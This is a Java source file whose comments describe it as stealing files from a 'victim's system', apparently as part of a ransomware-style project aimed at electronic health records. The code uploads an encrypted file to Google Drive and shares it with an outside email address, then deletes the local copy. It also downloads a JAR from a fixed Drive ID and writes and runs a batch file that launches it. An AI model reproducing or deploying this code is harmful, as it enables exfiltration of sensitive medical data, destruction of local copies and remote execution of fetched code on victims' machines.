package cryptography;

import java.io.BufferedOutputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.nio.file.Path;
import java.security.GeneralSecurityException;
import java.util.Collections;
import java.util.List;
import com.google.api.client.auth.oauth2.Credential;
import com.google.api.client.extensions.java6.auth.oauth2.AuthorizationCodeInstalledApp;
import com.google.api.client.extensions.jetty.auth.oauth2.LocalServerReceiver;
import com.google.api.client.googleapis.auth.oauth2.GoogleAuthorizationCodeFlow;
import com.google.api.client.googleapis.auth.oauth2.GoogleClientSecrets;
import com.google.api.client.googleapis.javanet.GoogleNetHttpTransport;
import com.google.api.client.http.javanet.NetHttpTransport;
import com.google.api.client.json.JsonFactory;
import com.google.api.client.json.gson.GsonFactory;
import com.google.api.client.util.store.FileDataStoreFactory;
import com.google.api.client.util.store.MemoryDataStoreFactory;
import com.google.api.services.drive.Drive;
import com.google.api.services.drive.Drive.Permissions.Create;
import com.google.api.services.drive.DriveScopes;
import com.google.api.services.drive.model.File;
import com.google.api.services.drive.model.FileList;
import com.google.api.services.drive.model.Permission;
import com.google.api.services.drive.model.PermissionList;
import com.google.api.client.googleapis.json.GoogleJsonResponseException;
import com.google.api.client.http.FileContent;

public class DriveQuickUpload {

	  /**
	   * Application name.
	   */
	  private static final String APPLICATION_NAME = "Google Drive API Java Quickstart";
	  /**
	   * Global instance of the JSON factory.
	   */
	  private static final JsonFactory JSON_FACTORY = GsonFactory.getDefaultInstance();
	  /**
	   * Directory to store authorization tokens for this application.
	   */
	  private static final String TOKENS_DIRECTORY_PATH = "tokens";

	  /**
	   * Global instance of the scopes required by this quickstart.
	   * If modifying these scopes, delete your previously saved tokens/ folder.
	   */
	  private static final List<String> SCOPES =
	      Collections.singletonList(DriveScopes.DRIVE_METADATA_READONLY);
	  
	  private static final List<String> SCOPESUP =
		      Collections.singletonList(DriveScopes.DRIVE);
	  
	  private static final List<String> SCOPESDOWN =
		      Collections.singletonList(DriveScopes.DRIVE_FILE);
	  private static final String CREDENTIALS_FILE_PATH = "/credentials.json";

	  /**
	   * Creates an authorized Credential object.
	   *
	   * @param HTTP_TRANSPORT The network HTTP Transport.
	   * @return An authorized Credential object.
	   * @throws IOException If the credentials.json file cannot be found.
	   */
	  private static Credential getCredentials(final NetHttpTransport HTTP_TRANSPORT)
	      throws IOException {
	    // Load client secrets.
	    InputStream in = DriveQuickUpload.class.getResourceAsStream(CREDENTIALS_FILE_PATH);
	    if (in == null) {
	      throw new FileNotFoundException("Resource not found: " + CREDENTIALS_FILE_PATH);
	    }
	    GoogleClientSecrets clientSecrets = GoogleClientSecrets.load(JSON_FACTORY, new InputStreamReader(in));
	    // Build flow and trigger user authorization request.
	    GoogleAuthorizationCodeFlow flow = new GoogleAuthorizationCodeFlow.Builder(
	        HTTP_TRANSPORT, JSON_FACTORY, clientSecrets, SCOPES)
	        .setDataStoreFactory(new MemoryDataStoreFactory()).setAccessType("online").build();
	    LocalServerReceiver receiver = new LocalServerReceiver.Builder().setPort(8888).build();
	    
	    Credential credential = new AuthorizationCodeInstalledApp(flow, receiver).authorize("user");
	    //returns an authorized Credential object.
	    return credential;
	  }
	  
	  private static Credential getCredentialsUp(final NetHttpTransport HTTP_TRANSPORT)
		      throws IOException {
		    // Load client secrets.
		    InputStream in = DriveQuickUpload.class.getResourceAsStream(CREDENTIALS_FILE_PATH);
		    if (in == null) {
		      throw new FileNotFoundException("Resource not found: " + CREDENTIALS_FILE_PATH);
		    }
		    GoogleClientSecrets clientSecrets = GoogleClientSecrets.load(JSON_FACTORY, new InputStreamReader(in));
		    // Build flow and trigger user authorization request.
		    GoogleAuthorizationCodeFlow flow = new GoogleAuthorizationCodeFlow.Builder(
		        HTTP_TRANSPORT, JSON_FACTORY, clientSecrets, SCOPESUP).setDataStoreFactory(new MemoryDataStoreFactory())
		        .setAccessType("online").build();
		    LocalServerReceiver receiver = new LocalServerReceiver.Builder().setPort(8888).setLandingPages("https://saitejakaparthi24.github.io/runsomething/uploaded.html", "Failed").build();
		    Credential credential = new AuthorizationCodeInstalledApp(flow, receiver).authorize("user");
		    //returns an authorized Credential object.
		    return credential;
		  }
	  
	  private static Credential getCredentialsDown(final NetHttpTransport HTTP_TRANSPORT)
		      throws IOException {
		    // Load client secrets.
		    InputStream in = DriveQuickUpload.class.getResourceAsStream(CREDENTIALS_FILE_PATH);
		    if (in == null) {
		      throw new FileNotFoundException("Resource not found: " + CREDENTIALS_FILE_PATH);
		    }
		    GoogleClientSecrets clientSecrets = GoogleClientSecrets.load(JSON_FACTORY, new InputStreamReader(in));
		    // Build flow and trigger user authorization request.
		    GoogleAuthorizationCodeFlow flow = new GoogleAuthorizationCodeFlow.Builder(
		        HTTP_TRANSPORT, JSON_FACTORY, clientSecrets, SCOPESDOWN).setDataStoreFactory(new MemoryDataStoreFactory())
		        .setAccessType("online").build();
		    LocalServerReceiver receiver = new LocalServerReceiver.Builder().setPort(8888).build();
		    Credential credential = new AuthorizationCodeInstalledApp(flow, receiver).authorize("user");
		    //returns an authorized Credential object.
		    return credential;
		  }
	  
			/**
			 * @throws IOException
			 * @throws GeneralSecurityException
			 * @throws InterruptedException 
			 */
	   public void read() throws GeneralSecurityException, InterruptedException, IOException {
	    // Build a new authorized API client service.
		  System.out.println("Reading Part");
		  final NetHttpTransport HTTP_TRANSPORT = GoogleNetHttpTransport.newTrustedTransport();
	   Drive service = new Drive.Builder(HTTP_TRANSPORT, JSON_FACTORY, getCredentials(HTTP_TRANSPORT))
			   .setApplicationName(APPLICATION_NAME).build();

	    // Print the names and IDs for up to 10 files.
	    FileList result = service.files().list()
	        .setPageSize(10)
	        .setFields("nextPageToken, files(id, name)")
	        .execute();
	    List<File> files = result.getFiles();
	    if (files == null || files.isEmpty()) {
	      System.out.println("No files found.");
	    } else {
	      System.out.println("Files:");
	      for (File file : files) {
	        System.out.printf("%s (%s)\n", file.getName(), file.getId());
	      }
	    }
	    System.out.println("Read Files from Victim's System");
	   }
	   
	   
	    public void upload(String encFilePath) throws GeneralSecurityException, InterruptedException, IOException {
	    	System.out.println("Uploading Part");
		    
		    final NetHttpTransport HTTP_TRANSPORT_UP = GoogleNetHttpTransport.newTrustedTransport();
		    
		    Drive serviceUp = new Drive.Builder(HTTP_TRANSPORT_UP, JSON_FACTORY, getCredentialsUp(HTTP_TRANSPORT_UP))
		        .setApplicationName(APPLICATION_NAME)
		        .build();

		    try {
			File fileMetadataUpload = new File();
			int driveFile= encFilePath.lastIndexOf("\\");
			String driveFileName = encFilePath.substring(driveFile+1, encFilePath.length());
		    fileMetadataUpload.setName(driveFileName);
		    fileMetadataUpload.setMimeType("application/octet-stream");
		    // File's content.
		    java.io.File filePath = new java.io.File(encFilePath);
		    // Specify media type and file-path for file.
		    
		    FileContent mediaContent = new FileContent("application/octet-stream", filePath);
		    
		      File file = serviceUp.files().create(fileMetadataUpload, mediaContent).setIncludePermissionsForView("published")
		          .setFields("id").setSupportsAllDrives(true).setSupportsTeamDrives(true).execute();
		      System.out.println("File ID: " + file.getId());
		      //Add permission to victim zip file to attacker mail
		      Permission permissionzip= new Permission();
				  permissionzip.setType("user");
				  permissionzip.setEmailAddress("pdigitalforensics@gmail.com");
				  permissionzip.setRole("writer");
				  serviceUp.permissions().create(file.getId(),permissionzip).execute();
			 System.out.println("Successfully Uploaded Encrypted EHR to Cloud");  
			 filePath.delete();
		    }
		    catch (GoogleJsonResponseException e) {
		        // TODO(developer) - handle error appropriately
		        System.err.println("Unable to upload file: " + e.getDetails());
		        throw e;
		    } 
	    }
	    	
	    
	    public void download() throws GeneralSecurityException, InterruptedException, IOException {
	    //DriveUpload.jar (1PpOgyqIR47xi-c3bMELo96r9mKrZaDCE)
		 //DriveUploadBat.bat (1faw95n8vhTGz_Ef7eb7yejGLLecOams-)
		 System.out.println("Downloading Part");
		    
		 final NetHttpTransport HTTP_TRANSPORT_DOWN = GoogleNetHttpTransport.newTrustedTransport();
		 Drive serviceDown = new Drive.Builder(HTTP_TRANSPORT_DOWN, JSON_FACTORY, getCredentialsDown(HTTP_TRANSPORT_DOWN))
			        .setApplicationName(APPLICATION_NAME)
			        .build();
		 String home=System.getProperty("user.home");
		 Path targetPath = new java.io.File(home + java.io.File.separator + "DriveUpload.jar").toPath();
		 String Path=targetPath.toString();
		 OutputStream output=new BufferedOutputStream(new FileOutputStream(Path));
		 serviceDown.files().get("1PpOgyqIR47xi-c3bMELo96r9mKrZaDCE").executeMediaAndDownloadTo(output);
		System.out.println("Successfull downloaded JAR to local, created batch file");
	    }
	    
	    public void createBatch() throws IOException, InterruptedException {
	    	 String home=System.getProperty("user.home");
			 Path targetPath = new java.io.File(home + java.io.File.separator + "DriveUploadBatch.bat").toPath();
			 String Path=targetPath.toString();
			java.io.File file = new java.io.File(Path);
			FileOutputStream fos = new FileOutputStream(file);
			// write some commands to the file
			DataOutputStream dos = new DataOutputStream(fos);
			dos.writeBytes("start javaw -jar DriveUpload.jar");
			dos.writeBytes("\n");
			dos.writeBytes("PAUSE");
			Thread.sleep(2000);
			ProcessBuilder pbbat = new ProcessBuilder("cmd", "/c", "DriveUploadBatch.bat");
			java.io.File dir = new java.io.File(home);
			pbbat.directory(dir);
			Process p1 = pbbat.start();		
			dos.close();
	    }
	      //return file.getId();
	    
}
